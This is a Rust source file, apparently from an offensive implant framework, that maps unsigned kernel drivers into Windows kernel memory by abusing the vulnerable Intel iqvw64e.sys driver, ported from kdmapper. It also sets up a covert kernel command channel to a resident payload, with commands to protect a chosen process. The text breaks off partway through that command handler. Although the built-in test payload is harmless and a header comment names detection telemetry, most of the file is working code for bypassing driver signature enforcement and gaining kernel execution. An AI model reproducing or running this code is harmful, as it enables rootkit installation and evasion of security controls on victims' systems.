//! KDMapper-style manual driver mapping (ABR-T018): with the Intel
//! "Nal" driver (iqvw64e.sys) loaded, an UNSIGNED driver PE is mapped
//! straight into NonPagedPool — no SCM service for the payload, no
//! signature check, no payload file on disk. The image bytes exist
//! only in the implant's memory and in the kernel pool.
//!
//! Flow ported from the reference implementation
//! (TheCruZ/kdmapper: kdmapper.cpp `MapDriver` + intel_driver.cpp):
//! allocation via a real `ExAllocatePoolWithTag(NonPagedPool, size)`
//! call through the NtAddAtom trampoline, image staged in a local
//! buffer (headers + initialized sections), DIR64 relocations applied
//! by delta, security-cookie fix, imports resolved against the
//! in-kernel export tables of the live module list (unresolved imports
//! abort the mapping — no nullstubs), one virtual copy into the pool,
//! a copy-verification readback, then `DriverEntry(param1, param2)`
//! through the call primitive.
//!
//! The builtin proof payload is generated in memory by
//! [`proof_driver_image`]: a minimal x64 native PE whose entry stamps
//! `0x0DEFACED` + a signature byte into a caller-supplied kernel
//! scratch buffer, calls one imported `RtlFillMemory` (length 0 —
//! proving import resolution) and references one absolute address
//! (proving relocation). Its semantics are unit-tested by executing it
//! in a usermode RWX view through the exact same staging code.
//!
//! Detection counterpart: the iqvw64e LOADER is the telemetry —
//! EID 7045 service install / EID 6 driver load for an image outside
//! `System32\drivers`, the `\\.\Nal` device and `iqvw64e` service
//! name. See `docs/detections/abr-t018.md`.

use crate::vdm::{kernel_export_rva, kernel_modules, ntoskrnl_base, Iqvw64e};

/// Pool tag of the reference implementation ('BwtE' family byte order).
const TAG: u64 = 0x4554_7742;
const POOL_NON_PAGED: u64 = 0;
/// The default x64 `__security_cookie` value written when a mapped
/// image ships an all-zero cookie (reference `FixSecurityCookie`).
const DEFAULT_SECURITY_COOKIE: u64 = 0x2B99_2DDF_A232;
/// Sanity ceiling for mapped images — a kernel driver larger than
/// this is almost certainly a parsing bug, not a payload.
const MAX_IMAGE_SIZE: u32 = 0x0020_0000;

/// Outcome of a successful mapping.
pub(crate) struct MapOutcome {
    pub image_base: u64,
    pub image_size: u32,
    pub relocs: u32,
    pub imports: u32,
    pub entry_status: u64,
}

/// Parsed essentials of a PE32+ driver image.
pub(crate) struct PeInfo {
    pub entry_rva: u32,
    pub image_base: u64,
    pub size_of_image: u32,
    pub size_of_headers: u32,
    pub import_dir: (u32, u32),
    pub reloc_dir: (u32, u32),
    pub load_config_dir: (u32, u32),
    pub sections: Vec<SectionInfo>,
}

pub(crate) struct SectionInfo {
    pub virtual_address: u32,
    pub pointer_to_raw: u32,
    pub size_of_raw: u32,
}

fn u16_at(buf: &[u8], off: usize) -> Result<u16, String> {
    let b = buf
        .get(off..off + 2)
        .ok_or_else(|| format!("read u16 at {off:#x} past end"))?;
    Ok(u16::from_le_bytes([b[0], b[1]]))
}

fn u32_at(buf: &[u8], off: usize) -> Result<u32, String> {
    let b = buf
        .get(off..off + 4)
        .ok_or_else(|| format!("read u32 at {off:#x} past end"))?;
    Ok(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn u64_at(buf: &[u8], off: usize) -> Result<u64, String> {
    let b = buf
        .get(off..off + 8)
        .ok_or_else(|| format!("read u64 at {off:#x} past end"))?;
    Ok(u64::from_le_bytes([
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
    ]))
}

fn cstr_at(buf: &[u8], off: usize) -> Result<String, String> {
    let bytes = buf
        .get(off..)
        .ok_or_else(|| format!("string at {off:#x} past end"))?;
    let end = bytes
        .iter()
        .position(|b| *b == 0)
        .ok_or_else(|| format!("string at {off:#x} unterminated"))?;
    Ok(String::from_utf8_lossy(&bytes[..end]).into_owned())
}

/// Parses and validates a PE32+ image: DOS header, x64 machine,
/// optional-header magic, one nonempty entry point inside the image
/// and sections whose raw slices stay inside the file.
pub(crate) fn parse_pe(image: &[u8]) -> Result<PeInfo, String> {
    if image.len() < 0x200 || &image[..2] != b"MZ" {
        return Err("not an MZ image".into());
    }
    let nt_off = u32_at(image, 0x3C)? as usize;
    if image.get(nt_off..nt_off + 4) != Some(b"PE\0\0") {
        return Err("PE signature missing".into());
    }
    if u16_at(image, nt_off + 4)? != 0x8664 {
        return Err("image is not x64".into());
    }
    let section_count = u16_at(image, nt_off + 6)? as usize;
    let optional_size = u16_at(image, nt_off + 20)? as usize;
    let optional_off = nt_off + 24;
    if optional_size < 0x70 {
        return Err("optional header truncated".into());
    }
    if u16_at(image, optional_off)? != 0x020B {
        return Err("optional header is not PE32+".into());
    }
    let entry_rva = u32_at(image, optional_off + 16)?;
    let image_base = u64_at(image, optional_off + 24)?;
    let size_of_image = u32_at(image, optional_off + 56)?;
    let size_of_headers = u32_at(image, optional_off + 60)?;
    if size_of_image > MAX_IMAGE_SIZE {
        return Err(format!("SizeOfImage {size_of_image:#x} above ceiling"));
    }
    if entry_rva == 0 || entry_rva >= size_of_image {
        return Err(format!("entry RVA {entry_rva:#x} outside image"));
    }
    let mut import_dir = (0u32, 0u32);
    let mut reloc_dir = (0u32, 0u32);
    let mut load_config_dir = (0u32, 0u32);
    let dir = |index: usize| -> Result<(u32, u32), String> {
        let off = optional_off + 0x70 + index * 8;
        Ok((u32_at(image, off)?, u32_at(image, off + 4)?))
    };
    if optional_size >= 0x78 + 6 * 8 {
        import_dir = dir(1)?;
        reloc_dir = dir(5)?;
    }
    if optional_size >= 0x78 + 7 * 8 {
        load_config_dir = dir(6)?;
    }
    let mut sections = Vec::with_capacity(section_count);
    for i in 0..section_count {
        let off = optional_off + optional_size + i * 40;
        if off + 40 > image.len() {
            return Err("section header past end of file".into());
        }
        let virtual_size = u32_at(image, off + 8)?;
        let virtual_address = u32_at(image, off + 12)?;
        let size_of_raw = u32_at(image, off + 16)?;
        let pointer_to_raw = u32_at(image, off + 20)?;
        if size_of_raw > 0 {
            if pointer_to_raw
                .checked_add(size_of_raw)
                .is_none_or(|end| end as usize > image.len())
            {
                return Err(format!(
                    "section {i} raw slice {pointer_to_raw:#x}+{size_of_raw:#x} outside file"
                ));
            }
            if virtual_address
                .checked_add(virtual_size.max(size_of_raw))
                .is_none_or(|end| end > size_of_image)
            {
                return Err(format!("section {i} virtual range outside image"));
            }
        }
        sections.push(SectionInfo {
            virtual_address,
            pointer_to_raw,
            size_of_raw,
        });
    }
    Ok(PeInfo {
        entry_rva,
        image_base,
        size_of_image,
        size_of_headers,
        import_dir,
        reloc_dir,
        load_config_dir,
        sections,
    })
}

/// Stages the image in a `SizeOfImage` local buffer: headers first,
/// then every initialized section at its virtual address. Bytes the
/// file does not carry (BSS tails) stay zero, matching a loader.
pub(crate) fn stage_sections(image: &[u8], info: &PeInfo) -> Result<Vec<u8>, String> {
    let mut local = vec![0u8; info.size_of_image as usize];
    let headers = (info.size_of_headers as usize).min(image.len());
    local[..headers].copy_from_slice(&image[..headers]);
    for section in &info.sections {
        if section.size_of_raw == 0 {
            continue; // CNT_UNINITIALIZED_DATA — zero-filled above
        }
        let va = section.virtual_address as usize;
        let raw = section.pointer_to_raw as usize;
        let len = section.size_of_raw as usize;
        local[va..va + len].copy_from_slice(&image[raw..raw + len]);
    }
    Ok(local)
}

/// Applies `IMAGE_REL_BASED_DIR64` relocations by `delta`
/// (actual base - preferred base). Absolute pads (type 0) are
/// skipped; any other relocation type aborts — on x64 only DIR64 is
/// legal, and silently ignoring a malformed table is how wrong-image
/// bugs are born.
pub(crate) fn apply_relocations(local: &mut [u8], delta: i64) -> Result<u32, String> {
    let (rva, size) = parse_ctx(local)?.reloc_dir;
    if rva == 0 {
        return Ok(0);
    }
    let end = rva
        .checked_add(size)
        .ok_or("relocation directory overflow")? as usize;
    let mut applied = 0u32;
    let mut cursor = rva as usize;
    while cursor + 8 <= end && cursor + 8 <= local.len() {
        let page_rva = u32_at(local, cursor)?;
        let block_size = u32_at(local, cursor + 4)? as usize;
        if block_size < 8 || cursor + block_size > end {
            return Err(format!("relocation block at {cursor:#x} malformed"));
        }
        for slot in cursor + 8..cursor + block_size - 1 {
            let entry = u16_at(local, slot)?;
            let kind = entry >> 12;
            let offset = (entry & 0x0FFF) as usize;
            match kind {
                0 => continue, // ABSOLUTE pad
                10 => {
                    let target = page_rva as usize + offset;
                    let value = u64_at(local, target)
                        .map_err(|e| format!("DIR64 target {target:#x}: {e}"))?;
                    let moved = (value as i64).wrapping_add(delta) as u64;
                    let slice = local
                        .get_mut(target..target + 8)
                        .ok_or_else(|| format!("DIR64 target {target:#x} outside image"))?;
                    slice.copy_from_slice(&moved.to_le_bytes());
                    applied += 1;
                }
                other => return Err(format!("unsupported relocation type {other}")),
            }
        }
        cursor += block_size;
    }
    Ok(applied)
}

/// Writes the default security cookie when the image ships a load
/// config with an all-zero cookie — a mapped driver that later calls
/// `__security_check_cookie` would bugcheck on the zero value.
pub(crate) fn fix_security_cookie(local: &mut [u8]) -> Result<bool, String> {
    let (rva, size) = parse_ctx(local)?.load_config_dir;
    if rva == 0 || size < 0x60 {
        return Ok(false);
    }
    let cookie_rva = u32_at(local, rva as usize + 0x58)? as usize;
    if cookie_rva == 0 || cookie_rva + 8 > local.len() {
        return Ok(false);
    }
    if u64_at(local, cookie_rva)? == 0 {
        local[cookie_rva..cookie_rva + 8].copy_from_slice(&DEFAULT_SECURITY_COOKIE.to_le_bytes());
        return Ok(true);
    }
    Ok(false)
}

/// Resolves and writes every import thunk in the staged image. The
/// resolver owns fallback policy (the reference retries a missing
/// module export against ntoskrnl). IAT slots are written in the
/// local buffer; an unresolved import aborts the whole mapping.
pub(crate) fn apply_imports<F>(local: &mut [u8], mut resolve: F) -> Result<u32, String>
where
    F: FnMut(&str, &str) -> Result<u64, String>,
{
    let (rva, size) = parse_ctx(local)?.import_dir;
    if rva == 0 {
        return Ok(0);
    }
    let end = (rva + size) as usize;
    let mut resolved = 0u32;
    let mut descriptor = rva as usize;
    while descriptor + 20 <= end.min(local.len()) {
        let original_first = u32_at(local, descriptor)? as usize;
        let name_rva = u32_at(local, descriptor + 12)? as usize;
        let first_thunk = u32_at(local, descriptor + 16)? as usize;
        if original_first == 0 && name_rva == 0 && first_thunk == 0 {
            break; // terminator
        }
        if name_rva == 0 || (original_first == 0 && first_thunk == 0) {
            return Err(format!(
                "import descriptor {descriptor:#x} has null name or thunks"
            ));
        }
        let module = cstr_at(local, name_rva)?;
        let thunk_rva = if original_first != 0 {
            original_first
        } else {
            first_thunk
        };
        let mut slot = 0usize;
        loop {
            let thunk = u64_at(local, thunk_rva + slot * 8)?;
            if thunk == 0 {
                break;
            }
            if thunk & (1u64 << 63) != 0 {
                return Err(format!("{module}: ordinal imports unsupported"));
            }
            let function = cstr_at(local, thunk as usize + 2)?;
            let address = resolve(&module, &function)
                .map_err(|e| format!("import {module}!{function}: {e}"))?;
            let iat = first_thunk + slot * 8;
            local[iat..iat + 8].copy_from_slice(&address.to_le_bytes());
            resolved += 1;
            slot += 1;
        }
        descriptor += 20;
    }
    Ok(resolved)
}

fn parse_ctx(local: &[u8]) -> Result<PeInfo, String> {
    // The staged buffer begins with the same headers as the file, so
    // the parser works on both; directories are read from the staged
    // copy exactly like a loader would.
    parse_pe(local)
}

/// Maps `image` into the kernel through the iqvw64e primitives and
/// invokes its entry with `(param1, param2)`. Every kernel function
/// call goes through the NtAddAtom trampoline and the whole primitive
/// surface is restored before returning.
pub(crate) fn kdmapper_map(
    driver: &Iqvw64e,
    image: &[u8],
    param1: u64,
    param2: u64,
    free_after_entry: bool,
) -> Result<MapOutcome, String> {
    let info = parse_pe(image)?;
    let mut local = stage_sections(image, &info)?;

    let kernel_base = ntoskrnl_base()?;
    let read64 = |a: u64| driver.read64(a);
    let ex_alloc =
        kernel_base + kernel_export_rva(read64, kernel_base, "ExAllocatePoolWithTag")? as u64;
    let ex_free = kernel_base + kernel_export_rva(read64, kernel_base, "ExFreePool")? as u64;

    // Modules for import resolution: lowercase basename -> base.
    let modules = kernel_modules()?;
    let modules: Vec<(String, u64)> = modules
        .into_iter()
        .map(|(path, base, _)| {
            let name = path
                .rsplit(['\\', '/'])
                .next()
                .unwrap_or(&path)
                .to_lowercase();
            (name, base)
        })
        .collect();
    let resolver = |module: &str, function: &str| -> Result<u64, String> {
        // ntoskrnl is entry zero of SystemModuleInformation with a
        // base already in hand — no name matching required.
        let base = if module == "ntoskrnl.exe" {
            kernel_base
        } else {
            modules
                .iter()
                .find(|(name, _)| name == module)
                .map(|(_, base)| *base)
                .ok_or_else(|| format!("module {module} not loaded"))?
        };
        match kernel_export_rva(read64, base, function) {
            Ok(rva) => Ok(base + rva as u64),
            Err(e) => {
                // Reference behavior: retry a non-ntoskrnl module's
                // export against ntoskrnl before giving up.
                if base == kernel_base {
                    return Err(e);
                }
                let rva = kernel_export_rva(read64, kernel_base, function)?;
                Ok(kernel_base + rva as u64)
            }
        }
    };

    let image_size = info.size_of_image as u64;
    let image_base = driver.call(ex_alloc, POOL_NON_PAGED, image_size, TAG, 0)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&image_base) {
        return Err(format!(
            "ExAllocatePoolWithTag returned implausible {image_base:#x}"
        ));
    }
    // The builtin proof image is freed on every outcome through this
    // single path (never inside map_after_alloc — that would double
    // free on its readback failure). Operator images stay resident.
    let result = map_after_alloc(
        driver, &mut local, &info, image_base, param1, param2, resolver,
    );
    if free_after_entry {
        driver.call(ex_free, image_base, 0, 0, 0).ok();
    }
    result
}

fn map_after_alloc<R>(
    driver: &Iqvw64e,
    local: &mut [u8],
    info: &PeInfo,
    image_base: u64,
    param1: u64,
    param2: u64,
    resolver: R,
) -> Result<MapOutcome, String>
where
    R: Fn(&str, &str) -> Result<u64, String>,
{
    let delta = image_base as i64 - info.image_base as i64;
    let relocs = apply_relocations(local, delta)?;
    let _cookie = fix_security_cookie(local)?;
    let imports = apply_imports(local, resolver)?;

    driver.write_buf(image_base, local)?;
    // Copy verification before jumping: the first 16 staged bytes must
    // read back identical through the kernel view. A mismatched copy
    // means the trampoline is unreliable and executing the entry would
    // be a jump into garbage (the Part-10 lesson, applied here). The
    // caller's free path owns pool cleanup.
    let mut readback = [0u8; 16];
    driver.read_buf(image_base, &mut readback)?;
    if readback != local[..16] {
        return Err("mapped image failed its readback - refusing to call entry".into());
    }

    let entry = image_base + info.entry_rva as u64;
    let entry_status = driver.call(entry, param1, param2, 0, 0)?;
    Ok(MapOutcome {
        image_base,
        image_size: info.size_of_image,
        relocs,
        imports,
        entry_status,
    })
}

// ---------------------------------------------------------------------------
// Builtin proof payload: a minimal PE32+ native driver built in memory.
// DriverEntry(rcx = param1 scratch, rdx = param2):
//   - call [RtlFillMemory] with (rcx, 0, 0) — length-0 fill exercises
//     import resolution with zero side effects;
//   - stamp 0x0DEFACED at [rcx];
//   - copy the first byte of the signature string (absolute address,
//     one DIR64 relocation) to [rcx+4];
//   - return STATUS_SUCCESS.
// ---------------------------------------------------------------------------

const TEXT_VA: u32 = 0x1000;
const IDATA_VA: u32 = 0x2000;
// Entry-code layout offsets (bytes from the entry point). The import
// call sits BETWEEN the test on rcx and the writes, so param1 must be
// saved in a NONVOLATILE register (rbx) around it — a Win64 callee may
// trash every volatile register.
pub(crate) const TEST_RCX: u32 = 0; // 48 85 C9
pub(crate) const JZ: u32 = 3; // 74 rel8 -> xor eax
pub(crate) const PUSH_RBX: u32 = 5; // 53
pub(crate) const MOV_RBX: u32 = 6; // 48 89 CB  (rbx = rcx)
pub(crate) const CALL_IAT: u32 = 9; // FF 15 disp32
pub(crate) const MOV_DWORD: u32 = 15; // C7 03 ED AC EF 0D ([rbx] = magic)
pub(crate) const MOVABS: u32 = 21; // 49 BB imm64 (relocated)
pub(crate) const MOVZX: u32 = 31; // 45 8A 13
pub(crate) const MOV_STORE: u32 = 34; // 44 88 53 04 ([rbx+4] = sig byte)
pub(crate) const POP_RBX: u32 = 38; // 5B
pub(crate) const XOR_EAX: u32 = 39; // 31 C0
const SIG_VA: u32 = TEXT_VA + 0x40;
const IDATA_DESC: u32 = IDATA_VA;
// Descriptor array (real + all-zero terminator, 2 x 20 bytes) ends at
// +0x28; the thunk arrays start after it so a terminator can never
// overlap a live thunk.
const IDATA_OFT: u32 = IDATA_VA + 0x30;
const IDATA_IAT: u32 = IDATA_VA + 0x50;
const IDATA_NAME: u32 = IDATA_VA + 0x80;
const IDATA_RELOC: u32 = IDATA_VA + 0xA0;
const IMAGE_BASE: u64 = 0x1_0000;

/// Builds the builtin proof driver image (raw file bytes).
pub(crate) fn proof_driver_image() -> Vec<u8> {
    // Entry code; displacements are computed from the layout above.
    let mut code: Vec<u8> = Vec::new();
    code.extend_from_slice(&[0x48, 0x85, 0xC9]); // test rcx, rcx
    let jz_rel = (XOR_EAX - (JZ + 2)) as u8;
    code.extend_from_slice(&[0x74, jz_rel]); // jz xor_eax
    code.push(0x53); // push rbx
    code.extend_from_slice(&[0x48, 0x89, 0xCB]); // mov rbx, rcx
    let rip_after_call = TEXT_VA + CALL_IAT + 6;
    let call_disp = (IDATA_IAT as i32).wrapping_sub(rip_after_call as i32);
    code.extend_from_slice(&[0xFF, 0x15]); // call [rip+disp32]
    code.extend_from_slice(&call_disp.to_le_bytes());
    // mov dword [rbx], 0x0DEFACED  (ModRM 03 = [rbx])
    code.extend_from_slice(&[0xC7, 0x03, 0xED, 0xAC, 0xEF, 0x0D]);
    code.extend_from_slice(&[0x49, 0xBB]); // movabs r11, imm64
                                           // The imm64 is a preferred-image VA (ImageBase + RVA); the DIR64
                                           // relocation later rebases it to the actual mapping.
    code.extend_from_slice(&(IMAGE_BASE + SIG_VA as u64).to_le_bytes());
    code.extend_from_slice(&[0x45, 0x8A, 0x13]); // movzx r10b, byte [r11]
    code.extend_from_slice(&[0x44, 0x88, 0x53, 0x04]); // mov byte [rbx+4], r10b
    code.push(0x5B); // pop rbx
    code.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
    code.push(0xC3); // ret
    assert_eq!(code.len() as u32, XOR_EAX + 3);
    // Layout self-check: every documented offset must hold its opcode
    // class so a future edit cannot silently shift the code.
    assert_eq!(
        &code[TEST_RCX as usize..TEST_RCX as usize + 3],
        &[0x48, 0x85, 0xC9]
    );
    assert_eq!(code[PUSH_RBX as usize], 0x53);
    assert_eq!(code[MOV_RBX as usize], 0x48);
    assert_eq!(code[MOV_DWORD as usize], 0xC7);
    assert_eq!(
        &code[MOV_DWORD as usize + 2..MOV_DWORD as usize + 6],
        &0x0DEF_ACEDu32.to_le_bytes()
    );
    assert_eq!(code[MOVZX as usize], 0x45);
    assert_eq!(code[MOV_STORE as usize + 2], 0x53); // ModRM [rbx+disp8]
    assert_eq!(code[POP_RBX as usize], 0x5B);

    let mut file = vec![0u8; 0x600]; // headers + .text + .idata
                                     // DOS header.
    file[0] = b'M';
    file[1] = b'Z';
    file[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    // File + optional headers (x64, native subsystem, 2 sections).
    let nt = 0x80usize;
    file[nt..nt + 4].copy_from_slice(b"PE\0\0");
    file[nt + 4..nt + 6].copy_from_slice(&0x8664u16.to_le_bytes()); // machine
    file[nt + 6..nt + 8].copy_from_slice(&2u16.to_le_bytes()); // sections
    file[nt + 20..nt + 22].copy_from_slice(&0xF0u16.to_le_bytes()); // optional size
    let opt = nt + 24;
    file[opt..opt + 2].copy_from_slice(&0x020Bu16.to_le_bytes()); // PE32+
    file[opt + 16..opt + 20].copy_from_slice(&TEXT_VA.to_le_bytes()); // entry
    file[opt + 24..opt + 32].copy_from_slice(&IMAGE_BASE.to_le_bytes());
    file[opt + 32..opt + 36].copy_from_slice(&0x1000u32.to_le_bytes()); // section align
    file[opt + 36..opt + 40].copy_from_slice(&0x200u32.to_le_bytes()); // file align
    file[opt + 44..opt + 48].copy_from_slice(&0x1000u32.to_le_bytes()); // size of code
    file[opt + 56..opt + 60].copy_from_slice(&0x3000u32.to_le_bytes()); // size of image
    file[opt + 60..opt + 64].copy_from_slice(&0x200u32.to_le_bytes()); // size of headers
    file[opt + 68..opt + 70].copy_from_slice(&1u16.to_le_bytes()); // subsystem: native
                                                                   // Data directories: imports (1) and base relocations (5).
    let dirs = opt + 0x70;
    file[dirs + 8..dirs + 12].copy_from_slice(&IDATA_DESC.to_le_bytes());
    file[dirs + 12..dirs + 16].copy_from_slice(&0x28u32.to_le_bytes());
    file[dirs + 40..dirs + 44].copy_from_slice(&IDATA_RELOC.to_le_bytes());
    file[dirs + 44..dirs + 48].copy_from_slice(&0x0Cu32.to_le_bytes());
    // Section headers: .text (RX code), .idata (RW data).
    let sec = opt + 0xF0;
    file[sec..sec + 5].copy_from_slice(b".text");
    file[sec + 8..sec + 12].copy_from_slice(&0x200u32.to_le_bytes()); // virtual size
    file[sec + 12..sec + 16].copy_from_slice(&TEXT_VA.to_le_bytes());
    file[sec + 16..sec + 20].copy_from_slice(&0x200u32.to_le_bytes()); // raw size
    file[sec + 20..sec + 24].copy_from_slice(&0x200u32.to_le_bytes()); // raw pointer
    file[sec + 36..sec + 40].copy_from_slice(&0x6000_0020u32.to_le_bytes());
    let sec2 = sec + 40;
    file[sec2..sec2 + 6].copy_from_slice(b".idata");
    file[sec2 + 8..sec2 + 12].copy_from_slice(&0x200u32.to_le_bytes());
    file[sec2 + 12..sec2 + 16].copy_from_slice(&IDATA_VA.to_le_bytes());
    file[sec2 + 16..sec2 + 20].copy_from_slice(&0x200u32.to_le_bytes());
    file[sec2 + 20..sec2 + 24].copy_from_slice(&0x400u32.to_le_bytes());
    file[sec2 + 36..sec2 + 40].copy_from_slice(&0xC000_0040u32.to_le_bytes());
    // .text: code + signature string.
    file[0x200..0x200 + code.len()].copy_from_slice(&code);
    let signature = b"abraham-kdmapper\0";
    file[0x200 + 0x40..0x200 + 0x40 + signature.len()].copy_from_slice(signature);
    // .idata: descriptor + terminator (zeros through +0x28), thunk
    // arrays, import-by-name, module name, one DIR64 relocation block
    // for the movabs operand.
    let idata = 0x400usize;
    let oft_thunk = (IDATA_VA + 0x60) as u64; // import-by-name RVA
    file[idata..idata + 4].copy_from_slice(&IDATA_OFT.to_le_bytes());
    file[idata + 12..idata + 16].copy_from_slice(&IDATA_NAME.to_le_bytes());
    file[idata + 16..idata + 20].copy_from_slice(&IDATA_IAT.to_le_bytes());
    file[idata + 0x30..idata + 0x38].copy_from_slice(&oft_thunk.to_le_bytes());
    file[idata + 0x50..idata + 0x58].copy_from_slice(&oft_thunk.to_le_bytes());
    let by_name = b"\0\0RtlFillMemory\0";
    file[idata + 0x60..idata + 0x60 + by_name.len()].copy_from_slice(by_name);
    let module = b"ntoskrnl.exe\0";
    file[idata + 0x80..idata + 0x80 + module.len()].copy_from_slice(module);
    let reloc_block = idata + 0xA0;
    file[reloc_block..reloc_block + 4].copy_from_slice(&TEXT_VA.to_le_bytes());
    file[reloc_block + 4..reloc_block + 8].copy_from_slice(&0x0Cu32.to_le_bytes());
    // DIR64 at page offset MOVABS+2 — the low byte of the imm64 slot.
    let entry = (10u16 << 12) | (MOVABS + 2) as u16;
    file[reloc_block + 8..reloc_block + 10].copy_from_slice(&entry.to_le_bytes());
    file
}

// ---------------------------------------------------------------------------
// Resident payload covert channel (ABR-T021). The km payload
// (payloads/abraham-km) is freestanding Rust with ZERO PE imports: the
// kernel functions it needs arrive through a table the mapper writes
// next to it, and its command protocol lives in a shared NonPagedPool
// block. KEEP IN SYNC with payloads/abraham-km/payload.rs (layout
// asserted in the tests below).
// ---------------------------------------------------------------------------

const KM_MAGIC: u32 = 0x484D_4241; // "ABMH"

/// Field offsets of the u32s inside the shared block.
const KM_COMMAND: u64 = 0x0C;

/// Layout mirror of payload.rs `SharedBlock` (64 bytes).
#[repr(C)]
struct KmShared {
    magic: u32,
    version: u32,
    heartbeat: u32,
    command: u32,
    command_arg: u32,
    command_status: u32,
    implant_pid: u32,
    links_offset: u32,
    pid_offset: u32,
    protect_offset: u32,
    protect_active: u32,
    reserved: [u32; 5],
}

/// Layout mirror of payload.rs `FnTable` (five u64 addresses).
#[repr(C)]
struct KmFnTable {
    ke_initialize_timer: u64,
    ke_initialize_dpc: u64,
    ke_set_timer_ex: u64,
    ke_cancel_timer: u64,
    ps_initial_system_process: u64,
}

static CHANNEL: std::sync::OnceLock<std::sync::Mutex<Option<u64>>> = std::sync::OnceLock::new();

fn channel_block() -> &'static std::sync::Mutex<Option<u64>> {
    CHANNEL.get_or_init(|| std::sync::Mutex::new(None))
}

/// Provisions the covert channel for a resident payload map: a zeroed
/// 0x1000 shared block (magic, implant pid and the live-discovered
/// EPROCESS offsets pre-filled) plus a 0x100 function table with the
/// resolved kernel exports. Returns (shared_kva, table_kva).
fn provision_channel(driver: &Iqvw64e) -> Result<(u64, u64), String> {
    let rw = crate::vdm::RwClient::open_preferred()?;
    let base = ntoskrnl_base()?;
    let read64 = |a: u64| driver.read64(a);
    let ex_alloc = base + kernel_export_rva(read64, base, "ExAllocatePoolWithTag")? as u64;

    let shared_kva = driver.call(ex_alloc, 0, 0x1000, TAG, 0)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&shared_kva) {
        return Err(format!("shared block alloc returned {shared_kva:#x}"));
    }
    driver.write_buf(shared_kva, &vec![0u8; 0x1000])?;

    // Live offsets for the payload's own EPROCESS walks (soft-fail: a
    // zero protect_offset just disables the protect command).
    let psis = base + kernel_export_rva(read64, base, "PsInitialSystemProcess")? as u64;
    let system_eproc = driver.read64(psis)?;
    let my_pid = std::process::id();
    let links_off = crate::vdm::discover_list_offsets_retrying(read64, system_eproc, my_pid)
        .ok()
        .and_then(|l| l.first().copied())
        .unwrap_or(0);
    let protect_off = crate::vdm::discover_protection_offset(&rw, system_eproc, links_off)
        .ok()
        .unwrap_or(0);

    let block = KmShared {
        magic: KM_MAGIC,
        version: 1,
        heartbeat: 0,
        command: 0,
        command_arg: 0,
        command_status: 0,
        implant_pid: my_pid,
        links_offset: links_off as u32,
        pid_offset: crate::vdm::EPROC_PID as u32,
        protect_offset: protect_off as u32,
        protect_active: 0,
        reserved: [0; 5],
    };
    let block_bytes = {
        let mut raw = [0u8; std::mem::size_of::<KmShared>()];
        let src = unsafe { std::slice::from_raw_parts(&block as *const _ as *const u8, raw.len()) };
        raw.copy_from_slice(src);
        raw
    };
    driver.write_buf(shared_kva, &block_bytes)?;

    let table_kva = driver.call(ex_alloc, 0, 0x100, TAG, 0)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&table_kva) {
        return Err(format!("fn table alloc returned {table_kva:#x}"));
    }
    let table = KmFnTable {
        ke_initialize_timer: base + kernel_export_rva(read64, base, "KeInitializeTimer")? as u64,
        ke_initialize_dpc: base + kernel_export_rva(read64, base, "KeInitializeDpc")? as u64,
        ke_set_timer_ex: base + kernel_export_rva(read64, base, "KeSetTimerEx")? as u64,
        ke_cancel_timer: base + kernel_export_rva(read64, base, "KeCancelTimer")? as u64,
        // Data export: the payload dereferences the ADDRESS fresh.
        ps_initial_system_process: psis,
    };
    let table_bytes = {
        let mut raw = [0u8; std::mem::size_of::<KmFnTable>()];
        let src = unsafe { std::slice::from_raw_parts(&table as *const _ as *const u8, raw.len()) };
        raw.copy_from_slice(src);
        raw
    };
    driver.write_buf(table_kva, &table_bytes)?;
    Ok((shared_kva, table_kva))
}

/// Reads the first 48 bytes of the channel block as u32 words.
fn channel_head(driver: &Iqvw64e, kva: u64) -> Result<[u32; 12], String> {
    let mut raw = [0u8; 48];
    driver.read_buf(kva, &mut raw)?;
    let mut words = [0u32; 12];
    for (i, word) in words.iter_mut().enumerate() {
        *word = u32::from_le_bytes(raw[i * 4..i * 4 + 4].try_into().unwrap());
    }
    Ok(words)
}

/// DRIVER `chan <cmd>` action (ABR-T021): hb | ping | protect <pid> |
/// unprotect | stop against the mapped resident payload.
pub fn chan_action(cmd: &str) -> Result<Vec<u8>, String> {
    let cmd = cmd.trim();
    let driver =
        Iqvw64e::open().map_err(|_| r"\\.\Nal not open (driver load iqvw64e first)".to_string())?;
    let kva = channel_block()
        .lock()
        .unwrap()
        .ok_or("no resident payload channel (driver map <payload.sys> first)")?;
    let head = channel_head(&driver, kva)?;
    let patch_command = |command: u32, arg: u32| -> Result<(), String> {
        let mut raw = [0u8; 8];
        raw[..4].copy_from_slice(&command.to_le_bytes());
        raw[4..].copy_from_slice(&arg.to_le_bytes());
        driver.write_buf(kva + KM_COMMAND, &raw)
    };
    match cmd.split_whitespace().next().unwrap_or("") {
        "hb" => Ok(format!(
            "chan: hb {} status {} active {} v{} (magic {:#x})",
            head[2], head[5], head[10], head[1], head[0]
        )
        .into_bytes()),
        "ping" => {
            patch_command(1, 0)?;
            std::thread::sleep(std::time::Duration::from_secs(3));
            let head = channel_head(&driver, kva)?;
            if head[5] == 0 {
                return Err("ping: no status after one tick - payload timer not running".into());
            }
            Ok(format!("chan: ping ok (echoed heartbeat {})", head[5]).into_bytes())
        }
        "protect" => {
            let pid: u32 = cmd
                .split_whitespace()
                .nth(1)
                .and_then(|v| v.parse().ok())
                .unwrap_or(head[6]);
            patch_command(2, pid)?;
            std::thread::sleep(std::time::Duration::from_secs(3));
            let head = channel_head(&driver, kva)?;
            if head[5] == 0xFFFF_FFFF {
                return Err(format!(
                    "chan: protect FAILED (payload status -1; offsets in block: links {:#x} pid {:#x} protect {:#x})",
                    head[7], head[8], head[9]
                ));
            }
            if head[10] == 0 {
                return Err("chan: protect not active after ack".into());
            }
            Ok(
                format!(
                    "chan: protect active on pid {pid} (kernel-side, re-applied every 2s tick)"
                )
                .into_bytes(),
            )
        }
        "unprotect" => {
            patch_command(3, 0)?;
            std::thread::sleep(std::time::Duration::from_secs(3));
            let head = channel_head(&driver, kva)?;
            if head[10] != 0 {
                return Err("chan: unprotect left protect_active set".into());
            }
